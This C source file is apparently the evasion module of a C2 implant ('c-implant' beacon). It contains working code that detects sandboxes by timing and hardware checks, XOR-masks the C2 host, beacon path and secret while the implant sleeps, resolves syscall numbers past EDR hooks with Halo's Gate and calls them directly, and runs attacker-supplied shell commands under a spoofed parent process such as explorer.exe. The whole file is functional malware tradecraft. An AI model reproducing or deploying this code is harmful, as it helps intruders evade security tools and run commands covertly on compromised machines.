/* evade.c — C implant evasion primitives (P1-6A). See evade.h.
 *
 * Build: x86_64 only (Halo's Gate + syscall stub are x64). The file is
 * compiled into every c-implant variant via the build-*.bat scripts.
 * Define SANDBOX_CHECKS=0 to strip the startup sandbox gate (lab escape
 * hatch for odd VMs; default ON).
 */
#include "evade.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

/* beacon.c provides these build-time/runtime strings for the shadow buffer. */
extern const char *evade_str_c2host(void);
extern const char *evade_str_beacon_path(void);
extern const char *evade_str_secret_id(void);
extern const char *evade_str_ua(void);

#ifndef SANDBOX_CHECKS
#define SANDBOX_CHECKS 1
#endif

/* cng_random lives in crypto_cng.c (BCryptGenRandom wrapper). */
extern int cng_random(BYTE *out, DWORD len);

/* ================= 1. sandbox gate ================= */

int evade_sandbox_check(void) {
#if !SANDBOX_CHECKS
    return 0;
#else
    /* Tick acceleration: sandboxes that skip sleeps return almost
     * immediately. Sleep() itself never returns early under load (only
     * late), so a short delta is a strong signal with ~zero FPs. */
    {
        ULONGLONG t0 = GetTickCount64();
        Sleep(750);
        ULONGLONG t1 = GetTickCount64();
        if (t1 - t0 < 650) {
            return 1;
        }
    }
    /* HW gate: single vCPU AND <2GiB RAM together. Either alone is common
     * on legit small VMs; the combination is sandbox-typical. */
    {
        SYSTEM_INFO si;
        MEMORYSTATUSEX ms;
        GetSystemInfo(&si);
        ms.dwLength = sizeof(ms);
        if (GlobalMemoryStatusEx(&ms)) {
            ULONGLONG ramMB = ms.ullTotalPhys / (1024ULL * 1024ULL);
            if (si.dwNumberOfProcessors < 2 && ramMB < 2048) {
                return 1;
            }
        }
    }
    return 0;
#endif
}

/* ================= 2. sleep mask ================= */

#define SM_BUF_SIZE 4096
#define SM_KEY_SIZE 32

static BYTE *g_sm_buf = NULL;      /* VirtualAlloc'd shadow buffer */
static BYTE g_sm_key[SM_KEY_SIZE]; /* rolling XOR key (CNG random) */
static DWORD g_sm_keyidx = 0;
static int g_sm_ready = 0;

static void sm_write_str(BYTE **pp, BYTE *end, const char *s) {
    size_t n;
    if (!s) s = "";
    n = strlen(s);
    if (*pp + 2 + n > end) return;
    (*pp)[0] = (BYTE)(n & 0xFF);
    (*pp)[1] = (BYTE)((n >> 8) & 0xFF);
    *pp += 2;
    if (n) {
        memcpy(*pp, s, n);
        *pp += n;
    }
}

int sleepmask_init(const char *uuid) {
    BYTE *p, *end;
    DWORD old;
    if (g_sm_ready) return 1;
    p = (BYTE *)VirtualAlloc(NULL, SM_BUF_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!p) return 0;
    if (cng_random(g_sm_key, SM_KEY_SIZE) != 0) {
        VirtualFree(p, 0, MEM_RELEASE);
        return 0;
    }
    g_sm_keyidx = 0;
    g_sm_buf = p;
    end = p + SM_BUF_SIZE;
    sm_write_str(&p, end, evade_str_c2host());
    sm_write_str(&p, end, evade_str_beacon_path());
    sm_write_str(&p, end, evade_str_secret_id());
    sm_write_str(&p, end, evade_str_ua());
    sm_write_str(&p, end, uuid);
    while (p < end) *p++ = 0;
    /* Park NOACCESS until the first sleep cycle (mirrors Go InitSleepMask). */
    VirtualProtect(g_sm_buf, SM_BUF_SIZE, PAGE_NOACCESS, &old);
    g_sm_ready = 1;
    return 1;
}

static void sm_xor_all(void) {
    DWORD i;
    for (i = 0; i < SM_BUF_SIZE; i++) {
        g_sm_buf[i] ^= g_sm_key[g_sm_keyidx % SM_KEY_SIZE];
        g_sm_keyidx++;
    }
}

/* ---- Halo's Gate NtDelayExecution SSN resolution (x64) ---- */

static DWORD g_ntdelay_ssn = 0;
static int g_ntdelay_resolved = 0;

typedef struct { DWORD rva; DWORD ssn; } halo_entry_t;

#define HALO_MAX_ENTRIES 2048
#define HALO_SCAN_RANGE 512

static int halo_entry_cmp(const void *a, const void *b) {
    DWORD ra = ((const halo_entry_t *)a)->rva;
    DWORD rb = ((const halo_entry_t *)b)->rva;
    if (ra < rb) return -1;
    if (ra > rb) return 1;
    return 0;
}

/* A clean x64 ntdll syscall stub starts: 4C 8B D1 B8 xx xx 00 00
 * (mov r10,rcx; mov eax,SSN). Anything else at the entry = hooked. */
static int halo_is_clean_stub(BYTE *addr, DWORD *ssn_out) {
    if (addr[0] == 0x4C && addr[1] == 0x8B && addr[2] == 0xD1 &&
        addr[3] == 0xB8 && addr[6] == 0x00 && addr[7] == 0x00) {
        if (ssn_out) *ssn_out = (DWORD)addr[4] | ((DWORD)addr[5] << 8);
        return 1;
    }
    return 0;
}

static DWORD halo_resolve_ntdelay(void) {
    BYTE *ntdll;
    IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS64 *nt;
    IMAGE_EXPORT_DIRECTORY *exp;
    DWORD *names, *funcs;
    WORD *ords;
    DWORD n, i, count = 0;
    halo_entry_t *tab = NULL;
    DWORD target_rva = 0;
    DWORD result = 0;

    ntdll = (BYTE *)GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return 0;
    dos = (IMAGE_DOS_HEADER *)ntdll;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    nt = (IMAGE_NT_HEADERS64 *)(ntdll + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;
    if (nt->OptionalHeader.NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_EXPORT) return 0;
    exp = (IMAGE_EXPORT_DIRECTORY *)(ntdll +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    names = (DWORD *)(ntdll + exp->AddressOfNames);
    funcs = (DWORD *)(ntdll + exp->AddressOfFunctions);
    ords = (WORD *)(ntdll + exp->AddressOfNameOrdinals);
    n = exp->NumberOfNames;

    tab = (halo_entry_t *)malloc(sizeof(halo_entry_t) * HALO_MAX_ENTRIES);
    if (!tab) return 0;

    for (i = 0; i < n && count < HALO_MAX_ENTRIES; i++) {
        const char *nm = (const char *)(ntdll + names[i]);
        /* Only syscall stubs matter; Nt* and Zw* share implementations. */
        if ((nm[0] == 'N' && nm[1] == 't') || (nm[0] == 'Z' && nm[1] == 'w')) {
            DWORD rva = funcs[ords[i]];
            BYTE *addr = ntdll + rva;
            DWORD ssn = 0;
            /* Forwarded exports point outside ntdll; skip them. */
            if (rva >= nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress &&
                rva < nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress +
                      nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size) {
                continue;
            }
            if (strcmp(nm, "NtDelayExecution") == 0) {
                target_rva = rva;
                if (halo_is_clean_stub(addr, &ssn)) {
                    result = ssn;
                    break;
                }
                /* Hooked: fall through to neighbor-derived SSN below. */
                tab[count].rva = rva;
                tab[count].ssn = 0xFFFFFFFFu; /* marker: target, SSN unknown */
                count++;
                continue;
            }
            if (halo_is_clean_stub(addr, &ssn)) {
                tab[count].rva = rva;
                tab[count].ssn = ssn;
                count++;
            }
        }
    }
    if (result) {
        free(tab);
        return result;
    }
    if (!target_rva || !count) {
        free(tab);
        return 0;
    }
    qsort(tab, count, sizeof(halo_entry_t), halo_entry_cmp);
    /* Halo's Gate: nearest clean neighbors bracket the target; SSN steps
     * by export-address order. Prefer the down-neighbor, confirm with the
     * up-neighbor; fall back to up-only when nothing is below. */
    for (i = 0; i < count; i++) {
        DWORD k;
        if (tab[i].rva != target_rva || tab[i].ssn != 0xFFFFFFFFu) continue;
        for (k = i; k > 0 && i - k <= HALO_SCAN_RANGE; k--) {
            if (tab[k - 1].ssn == 0xFFFFFFFFu) continue;
            result = tab[k - 1].ssn + (i - (k - 1));
            break;
        }
        if (result) {
            /* Confirm against the up-neighbor when one is in range. */
            for (k = i + 1; k < count && k - i <= HALO_SCAN_RANGE; k++) {
                DWORD up;
                if (tab[k].ssn == 0xFFFFFFFFu) continue;
                up = tab[k].ssn - (k - i);
                if (up != result) result = 0; /* disagree: distrust */
                break;
            }
        }
        if (!result) {
            for (k = i + 1; k < count && k - i <= HALO_SCAN_RANGE; k++) {
                if (tab[k].ssn == 0xFFFFFFFFu) continue;
                result = tab[k].ssn - (k - i);
                break;
            }
        }
        break;
    }
    free(tab);
    return result;
}

/* Direct NtDelayExecution via resolved SSN. alertable=FALSE, interval in
 * 100ns units (negative = relative). x64 mingw GCC inline syscall. */
static LONG ntdelay_hgate(BOOLEAN alert, PLARGE_INTEGER iv) {
    DWORD ssn;
    LONG st;
    if (!g_ntdelay_resolved) {
        g_ntdelay_ssn = halo_resolve_ntdelay();
        g_ntdelay_resolved = 1;
    }
    ssn = g_ntdelay_ssn;
    if (!ssn) return -1;
    __asm__ volatile (
        "movq %2, %%rcx\n\t"
        "movq %3, %%rdx\n\t"
        "movq %%rcx, %%r10\n\t"
        "movl %1, %%eax\n\t"
        "syscall\n\t"
        "movl %%eax, %0\n\t"
        : "=r" (st)
        : "r" (ssn),
          "r" ((unsigned long long)(alert ? 1 : 0)),
          "r" ((unsigned long long)(unsigned long long)iv)
        : "rax", "rcx", "rdx", "r10", "r11", "memory"
    );
    return st;
}

void sleepmask_sleep(DWORD ms) {
    DWORD old = 0;
    if (!g_sm_ready) {
        Sleep(ms);
        return;
    }
    /* Encrypt + park. */
    VirtualProtect(g_sm_buf, SM_BUF_SIZE, PAGE_READWRITE, &old);
    sm_xor_all();
    VirtualProtect(g_sm_buf, SM_BUF_SIZE, PAGE_NOACCESS, &old);
    /* Sleep via direct syscall; fallback to hooked Sleep on failure. */
    {
        LARGE_INTEGER iv;
        LONGLONG q = -((LONGLONG)ms * 10000LL);
        if (ms == 0) q = -10000LL;
        iv.QuadPart = q;
        if (ntdelay_hgate(FALSE, &iv) != 0) {
            Sleep(ms);
        }
    }
    /* Restore. */
    VirtualProtect(g_sm_buf, SM_BUF_SIZE, PAGE_READWRITE, &old);
    sm_xor_all();
    VirtualProtect(g_sm_buf, SM_BUF_SIZE, PAGE_NOACCESS, &old);
}

/* ================= 3. PPID-spoofed shell exec ================= */

/* Explorer PID via process enumeration (stable, unlike GetShellWindow
 * which can hand back a transient window owner). 0 when absent. */
static DWORD find_process_by_name(const char *name, DWORD session) {
    HANDLE snap;
    PROCESSENTRY32 pe;
    DWORD found = 0;
    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            DWORD sess = 0xFFFFFFFFu;
            if (_stricmp(pe.szExeFile, name) != 0) continue;
            ProcessIdToSessionId(pe.th32ProcessID, &sess);
            if (sess != session) continue;
            found = pe.th32ProcessID;
            break;
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

static DWORD my_parent_pid(void) {
    HANDLE snap;
    PROCESSENTRY32 pe;
    DWORD self = GetCurrentProcessId();
    DWORD ppid = 0;
    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            if (pe.th32ProcessID == self) {
                ppid = pe.th32ParentProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return (ppid == self) ? 0 : ppid;
}

/* A spoof candidate must be alive and in our session at USE time (checked
 * after OpenProcess): PIDs recycle and sessions isolate. */
static int parent_candidate_ok(HANDLE h, DWORD *session_out) {
    DWORD ec = 0;
    DWORD sess = 0xFFFFFFFFu;
    DWORD pid;
    if (!h) return 0;
    if (!GetExitCodeProcess(h, &ec) || ec != STILL_ACTIVE) return 0;
    pid = GetProcessId(h);
    if (!pid || pid == GetCurrentProcessId()) return 0;
    ProcessIdToSessionId(pid, &sess);
    if (session_out) *session_out = sess;
    return 1;
}

/* Pick a stable spoof parent: our own (live, same-session) parent first,
 * explorer.exe second. Our parent shares our session/token context, which
 * keeps stdio/job behavior identical to an unspoofed spawn; explorer is
 * the classic blending choice when it qualifies. Returns 0 when nothing
 * qualifies — the caller then falls back to _popen. */
static DWORD spoof_parent_pid(void) {
    DWORD mySession = 0xFFFFFFFFu;
    DWORD cand = 0;
    HANDLE h = NULL;
    ProcessIdToSessionId(GetCurrentProcessId(), &mySession);
    cand = my_parent_pid();
    if (cand) {
        h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, cand);
        if (h) {
            DWORD sess = 0xFFFFFFFFu;
            int ok = parent_candidate_ok(h, NULL);
            ProcessIdToSessionId(cand, &sess);
            CloseHandle(h);
            if (ok && sess == mySession) return cand;
        }
    }
    cand = find_process_by_name("explorer.exe", mySession);
    if (cand) {
        h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, cand);
        if (parent_candidate_ok(h, NULL)) {
            DWORD sess = 0xFFFFFFFFu;
            ProcessIdToSessionId(cand, &sess);
            CloseHandle(h);
            if (sess == mySession) return cand;
        } else if (h) {
            CloseHandle(h);
        }
    }
    return 0;
}

/* Raw PPID-spoofed spawn+capture. Returns NULL on any failure (caller
 * falls back); a non-NULL return may still carry zero bytes when the
 * command itself produced no output. */
static char *spoof_spawn_capture(const char *cmd, DWORD *outlen, DWORD out_cap) {    char *cmdline = NULL;
    size_t cmdlen;
    WCHAR *wcmd = NULL;
    int wlen;
    HANDLE hRead = NULL, hWrite = NULL;
    SECURITY_ATTRIBUTES sa;
    STARTUPINFOEXW siex;
    PROCESS_INFORMATION pi;
    SIZE_T attrSize = 0;
    HANDLE hParent = NULL;
    DWORD ppid;
    char *buf = NULL;
    size_t cap = 65536, len = 0;
    char chunk[8192];
    DWORD avail;

    memset(&siex, 0, sizeof(siex));
    memset(&pi, 0, sizeof(pi));

    if (!cmd) cmd = "";
    /* Mirror _popen: run through cmd.exe /c. */
    cmdlen = strlen(cmd) + 16;
    cmdline = (char *)malloc(cmdlen);
    if (!cmdline) return NULL;
    _snprintf(cmdline, cmdlen, "cmd.exe /c %s", cmd);

    ppid = spoof_parent_pid();
    if (!ppid) return NULL;
    hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, ppid);
    if (!hParent) return NULL;

    memset(&sa, 0, sizeof(sa));
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) goto fail;
    /* Parent keeps read end un-inherited; child inherits write end only. */
    if (!SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0)) goto fail;

    memset(&siex, 0, sizeof(siex));
    siex.StartupInfo.cb = sizeof(siex);
    siex.StartupInfo.dwFlags = STARTF_USESTDHANDLES;
    siex.StartupInfo.hStdOutput = hWrite;
    siex.StartupInfo.hStdError = hWrite;
    siex.StartupInfo.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(), 0, attrSize);
    if (!siex.lpAttributeList) goto fail;
    if (!InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &attrSize))
        goto fail;
    if (!UpdateProcThreadAttribute(siex.lpAttributeList, 0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &hParent, sizeof(hParent), NULL, NULL))
        goto fail;

    wlen = MultiByteToWideChar(CP_UTF8, 0, cmdline, -1, NULL, 0);
    wcmd = (WCHAR *)malloc((size_t)wlen * sizeof(WCHAR));
    if (!wcmd || !MultiByteToWideChar(CP_UTF8, 0, cmdline, -1, wcmd, wlen))
        goto fail;

    memset(&pi, 0, sizeof(pi));
    if (!CreateProcessW(NULL, wcmd,
            NULL, NULL, TRUE,
            EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
            NULL, NULL, &siex.StartupInfo, &pi))
        goto fail;

    /* Parent side: close write end, drain read end (mirror exec_shell caps). */
    CloseHandle(hWrite);
    hWrite = NULL;
    buf = (char *)malloc(cap);
    if (!buf) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        goto fail;
    }
    for (;;) {
        DWORD got = 0;
        if (!ReadFile(hRead, chunk, sizeof(chunk), &got, NULL) || got == 0) {
            if (GetLastError() == ERROR_BROKEN_PIPE) break;
            if (WaitForSingleObject(pi.hProcess, 50) == WAIT_OBJECT_0) {
                /* Process exited: drain once more, then stop. */
                if (!PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL) || avail == 0)
                    break;
                continue;
            }
        }
        if (got == 0) continue;
        if (len + got + 1 > cap) {
            size_t ncap;
            if (cap >= out_cap) break;
            ncap = cap * 2;
            if (ncap > (size_t)out_cap + 65536) ncap = (size_t)out_cap + 65536;
            buf = (char *)realloc(buf, ncap);
            if (!buf) {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                goto fail;
            }
            cap = ncap;
        }
        if (len >= out_cap) break;
        if (len + got > out_cap) got = out_cap - (DWORD)len;
        memcpy(buf + len, chunk, got);
        len += got;
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    if (buf) buf[len] = '\0';
    if (outlen) *outlen = (DWORD)len;
    free(cmdline);
    free(wcmd);
    CloseHandle(hRead);
    if (hParent) CloseHandle(hParent);
    if (siex.lpAttributeList) {
        DeleteProcThreadAttributeList(siex.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);
    }
    return buf;

fail:
    if (cmdline) free(cmdline);
    if (wcmd) free(wcmd);
    if (hRead) CloseHandle(hRead);
    if (hWrite) CloseHandle(hWrite);
    if (hParent) CloseHandle(hParent);
    if (siex.lpAttributeList) {
        DeleteProcThreadAttributeList(siex.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);
    }
    if (buf) free(buf);
    return NULL;
}

/* _popen path with exec_shell's output contract (OUT_CAP bound). */
static char *exec_shell_popen(const char *cmd, DWORD *outlen, DWORD out_cap) {
    FILE *fp;
    size_t cap2 = 65536, len2 = 0, m;
    char chunk[8192];
    char *buf;
    if (!cmd) cmd = "";
    fp = _popen(cmd, "r");
    if (!fp) {
        buf = (char *)malloc(64);
        if (buf) {
            strcpy_s(buf, 64, "[cbeacon] exec failed");
            if (outlen) *outlen = (DWORD)strlen(buf);
        } else if (outlen) {
            *outlen = 0;
        }
        return buf;
    }
    buf = (char *)malloc(cap2);
    if (!buf) { _pclose(fp); return NULL; }
    while ((m = fread(chunk, 1, sizeof(chunk), fp)) > 0) {
        if (len2 + m + 1 > cap2) {
            if (cap2 >= out_cap) break;
            cap2 *= 2;
            if (cap2 > (size_t)out_cap + 65536) cap2 = (size_t)out_cap + 65536;
            buf = (char *)realloc(buf, cap2);
            if (!buf) { _pclose(fp); return NULL; }
        }
        if (len2 >= out_cap) break;
        if (len2 + m > out_cap) m = out_cap - len2;
        memcpy(buf + len2, chunk, m);
        len2 += m;
    }
    _pclose(fp);
    buf[len2] = '\0';
    if (outlen) *outlen = (DWORD)len2;
    return buf;
}

/* Spoof-path liveness probe: some platforms (sandboxes, silos, hardened
 * hosts) let the spoofed spawn run but swallow its stdio. A fixed nonce
 * round-trip proves capture works; on mismatch the session pins to _popen.
 * Probed once per process (first shell task pays ~one extra spawn). */
static int g_spoof_tested = 0;
static int g_spoof_ok = 0;

static int spoof_selftest(void) {
    BYTE rnd[8];
    char nonce[24];
    char cmd[64];
    char *out;
    DWORD outlen = 0;
    DWORD i;
    int ok = 0;
    if (cng_random(rnd, sizeof(rnd)) != 0) return 0;
    for (i = 0; i < sizeof(rnd); i++)
        _snprintf(nonce + i * 2, 3, "%02X", rnd[i]);
    _snprintf(cmd, sizeof(cmd), "echo %s", nonce);
    out = spoof_spawn_capture(cmd, &outlen, 65536);
    if (out && outlen > 0 && strstr(out, nonce) != NULL) ok = 1;
    if (out) free(out);
    return ok;
}

char *exec_shell_spoofed(const char *cmd, DWORD *outlen, DWORD out_cap) {
    char *out;
    if (!g_spoof_tested) {
        g_spoof_tested = 1;
        g_spoof_ok = spoof_selftest();
    }
    if (g_spoof_ok) {
        out = spoof_spawn_capture(cmd, outlen, out_cap);
        if (out) return out;
        /* A probe-passing path that later fails degrades to _popen for
         * this call only (verdict stays: transient, not platform). */
    }
    return exec_shell_popen(cmd, outlen, out_cap);
}
